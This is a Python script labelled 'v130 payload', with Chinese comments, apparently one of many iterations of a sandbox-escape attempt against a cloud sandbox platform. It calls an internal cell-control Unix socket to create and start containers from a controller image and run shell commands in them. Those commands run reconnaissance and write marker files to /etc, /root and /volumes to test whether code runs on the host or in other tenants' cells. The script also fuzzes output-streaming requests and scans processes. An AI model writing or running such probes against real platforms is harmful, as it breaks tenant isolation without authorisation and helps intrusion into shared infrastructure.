# -*- coding: utf-8 -*-
"""v130 payload: v113 时序 (Start 后立即 Exec) + StreamOutput stream 字段变体
目标: 拿到 Exec 进程输出 -> 判定执行环境 (host 容器 / 其他 cell)
输出 /vercel/sandbox/v130c.out"""
import socket, struct, time, json, os, signal

OUT = '/vercel/sandbox/v130c.out'
f = open(OUT, 'w', encoding='utf-8', errors='replace')
signal.alarm(280)


def log(s):
    line = '[%.1f] %s' % (time.time(), s)
    try:
        f.write(line + '\n')
        f.flush()
    except Exception:
        pass
    print(line, flush=True)


CELL = '/run/cell/cell.sock'
CTRS = '/vercel.hive.cell.api.containers.v1.ContainersService'
PROC = '/vercel.hive.cell.api.processes.v1.ProcessService'
IMG = '977805900156.dkr.ecr.us-east-1.amazonaws.com/sandbox-controller@sha256:95fd06013f4e1708be914dc973663ab50e48d0045087340cc71cf903e2841b59'


def connect_unix(sockpath, path, body, t=6.0, ctype='application/json'):
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect(sockpath)
        req = ('POST %s HTTP/1.1\r\nHost: unix\r\nContent-Type: %s\r\n'
               'Connect-Protocol-Version: 1\r\nContent-Length: %d\r\nConnection: close\r\n\r\n'
               % (path, ctype, len(body))).encode() + body
        s.sendall(req)
        d = b''
        try:
            while True:
                c = s.recv(65536)
                if not c:
                    break
                d += c
        except Exception:
            pass
        s.close()
        status = d.split(b'\r\n', 1)[0].decode(errors='replace') if d else 'NO_RESP'
        hdr_end = d.find(b'\r\n\r\n')
        return status, d[hdr_end + 4:hdr_end + 4 + 800] if hdr_end > 0 else b''
    except Exception as e:
        return 'EXC %s' % type(e).__name__, b''


def dechunk(d):
    out = b''
    off = 0
    while off < len(d):
        i = d.find(b'\r\n', off)
        if i < 0:
            break
        try:
            ln = int(d[off:i].split(b';')[0], 16)
        except Exception:
            break
        if ln == 0:
            break
        out += d[i + 2:i + 2 + ln]
        off = i + 2 + ln + 2
    return out


def stream_data(sockpath, path, payload, ctype, t=15.0):
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect(sockpath)
        env1 = b'\x00' + struct.pack('>I', len(payload)) + payload
        req = ('POST %s HTTP/1.1\r\nHost: unix\r\nContent-Type: %s\r\n'
               'Connect-Protocol-Version: 1\r\nContent-Length: %d\r\n\r\n'
               % (path, ctype, len(env1))).encode() + env1
        s.sendall(req)
        s.shutdown(socket.SHUT_WR)
        d = b''
        try:
            while True:
                c = s.recv(65536)
                if not c:
                    break
                d += c
        except Exception:
            pass
        s.close()
        status = d.split(b'\r\n', 1)[0].decode(errors='replace') if d else 'NO_RESP'
        hdr_end = d.find(b'\r\n\r\n')
        body = d[hdr_end + 4:] if hdr_end > 0 else b''
        body = dechunk(body)
        return status, body
    except Exception as e:
        return 'EXC %s' % type(e).__name__, b''


# ---------------- 1: Create + Start + 立即 Exec (v113 时序) ----------------
log('=== 1 create-start-exec ===')
st, pay = connect_unix(CELL, '%s/Create' % CTRS, json.dumps({'image': IMG}).encode(), t=12)
log('Create -> %s %r' % (st, pay[:400]))
cid = None
try:
    cid = json.loads(pay.decode()).get('containerId')
except Exception:
    pass
log('cid=%s' % cid)
if not cid:
    f.close()
    raise SystemExit

st, pay = connect_unix(CELL, '%s/Start' % CTRS, json.dumps({'containerId': cid}).encode(), t=8)
log('Start -> %s %r' % (st, pay[:200]))

CMD = ("echo ===E0===; id; hostname; pwd; uname -a; "
       "cat /proc/1/cmdline 2>&1 | head -c 300; echo; "
       "ls / 2>&1 | head -40; ls /volumes/ 2>&1 | head -20; "
       "ls /run/vercel/ 2>&1; cat /proc/self/cgroup 2>&1; "
       "echo ===E1===; "
       "echo HOSTMARK1 > /tmp/hostm1.txt 2>&1; echo HOSTMARK2 > /etc/hostm2.txt 2>&1; "
       "echo HOSTMARK3 > /opt/hostm3.txt 2>&1; echo HOSTMARK4 > /root/hostm4.txt 2>&1; "
       "echo HOSTMARK5 > /volumes/hostm5.txt 2>&1; "
       "ls -la /tmp/ 2>&1 | head -15; "
       "echo ===E2===; sleep 120")
st, pay = connect_unix(CELL, '%s/Exec' % CTRS,
                       json.dumps({'containerId': cid, 'process': {'args': ['/bin/sh', '-c', CMD]}}).encode(), t=6)
log('Exec -> %s %r' % (st, pay[:300]))
pid = None
try:
    pid = json.loads(pay.decode()).get('processId')
except Exception:
    pass
log('processId=%s' % pid)

# ---------------- 2: StreamOutput 全变体 ----------------
log('=== 2 StreamOutput variants ===')
if pid:
    variants = [
        ('json-stdout', json.dumps({'processId': pid, 'stream': 'stdout'}).encode(), 'application/connect+json'),
        ('json-stderr', json.dumps({'processId': pid, 'stream': 'stderr'}).encode(), 'application/connect+json'),
        ('json-both', json.dumps({'processId': pid, 'stream': 'both'}).encode(), 'application/connect+json'),
        ('json-all', json.dumps({'processId': pid, 'stream': 'all'}).encode(), 'application/connect+json'),
        ('json-1', json.dumps({'processId': pid, 'stream': 1}).encode(), 'application/connect+json'),
        ('json-only', json.dumps({'processId': pid}).encode(), 'application/connect+json'),
        ('proto-0', b'\x0a' + bytes([len(pid)]) + pid.encode() + b'\x10\x00', 'application/connect+proto'),
        ('proto-1', b'\x0a' + bytes([len(pid)]) + pid.encode() + b'\x10\x01', 'application/connect+proto'),
        ('proto-2', b'\x0a' + bytes([len(pid)]) + pid.encode() + b'\x10\x02', 'application/connect+proto'),
        ('proto-3', b'\x0a' + bytes([len(pid)]) + pid.encode() + b'\x10\x03', 'application/connect+proto'),
    ]
    for name, v, ct in variants:
        st, out = stream_data(CELL, '%s/StreamOutput' % PROC, v, ct, t=10)
        txt = ''.join(chr(b) for b in out if 32 <= b < 127 or b in (10, 13))
        log('SO[%s] %s out=%r' % (name, st, txt[:800]))

# ---------------- 3: Wait/Kill + pid 扫描 ----------------
log('=== 3 wait/kill ===')
if pid:
    st, pay = connect_unix(CELL, '%s/Wait' % PROC, json.dumps({'processId': pid}).encode(), t=10)
    log('Wait -> %s %r' % (st, pay[:300]))
    st, pay = connect_unix(CELL, '%s/Kill' % PROC, json.dumps({'processId': pid}).encode(), t=4)
    log('ProcKill -> %s %r' % (st, pay[:300]))

log('=== 4 pid scan ===')
try:
    for d in os.listdir('/proc'):
        if not d.isdigit():
            continue
        try:
            comm = open('/proc/%s/comm' % d).read().strip()
            if comm in ('sh', 'sleep', 'sandboxctrl', 'celld'):
                log('proc %s comm=%s' % (d, comm))
        except Exception:
            pass
except Exception as e:
    log('scan EXC %s' % e)

# cleanup
st, pay = connect_unix(CELL, '%s/Kill' % CTRS, json.dumps({'containerId': cid}).encode(), t=3)
log('Cleanup Kill -> %s' % st)

log('V130_DONE')
f.close()
